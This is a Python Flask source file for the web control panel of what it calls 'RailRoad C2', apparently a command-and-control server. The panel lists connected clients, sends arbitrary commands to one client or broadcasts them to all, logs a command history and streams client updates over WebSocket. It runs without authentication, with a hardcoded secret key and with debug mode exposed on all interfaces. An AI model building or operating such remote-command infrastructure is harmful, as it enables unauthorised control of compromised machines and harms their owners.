from flask import Flask, render_template, request, jsonify, session
from flask_socketio import SocketIO, emit
import threading
import time
from datetime import datetime
import json

# Import the backend server
import sys
import os
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'backend'))
from server import server_instance, CommandHandler

app = Flask(__name__)
app.config['SECRET_KEY'] = 'railroad_c2_secret_key'
socketio = SocketIO(app, async_mode='threading')

# Store command history and results
command_history = []
client_results = {}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/clients')
def get_clients():
    clients = server_instance.client_manager.get_clients()
    return jsonify(clients)

@app.route('/api/command', methods=['POST'])
def send_command():
    data = request.json
    client_id = data.get('client_id')
    command = data.get('command')
    
    if not command:
        return jsonify({'error': 'No command provided'}), 400
    
    # Record command in history
    cmd_entry = {
        'id': len(command_history) + 1,
        'client_id': client_id,
        'command': command,
        'timestamp': datetime.now().isoformat(),
        'type': 'single' if client_id else 'broadcast'
    }
    command_history.append(cmd_entry)
    
    # Send command to client(s)
    if client_id and client_id != 'broadcast':
        success = server_instance.client_manager.send_command(client_id, command)
        if success:
            socketio.emit('command_sent', cmd_entry)
            return jsonify({'message': f'Command sent to {client_id}'})
        else:
            return jsonify({'error': f'Failed to send command to {client_id}'}), 400
    else:
        # Broadcast to all clients
        results = server_instance.client_manager.broadcast_command(command)
        socketio.emit('command_broadcast', cmd_entry)
        return jsonify({
            'message': f'Command broadcast to {sum(results.values())} clients',
            'results': results
        })

@app.route('/api/history')
def get_history():
    return jsonify(command_history)

@socketio.on('connect')
def handle_connect():
    print('Client connected to WebSocket')
    emit('status', {'message': 'Connected to RailRoad C2'})

@socketio.on('disconnect')
def handle_disconnect():
    print('Client disconnected from WebSocket')

def background_client_updater():
    """Background thread to update client list periodically"""
    while True:
        try:
            clients = server_instance.client_manager.get_clients()
            socketio.emit('clients_update', clients)
        except Exception as e:
            print(f"Error in background updater: {e}")
        time.sleep(5)

if __name__ == '__main__':
    # Start background thread for client updates
    updater_thread = threading.Thread(target=background_client_updater)
    updater_thread.daemon = True
    updater_thread.start()
    
    # Start the web interface
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)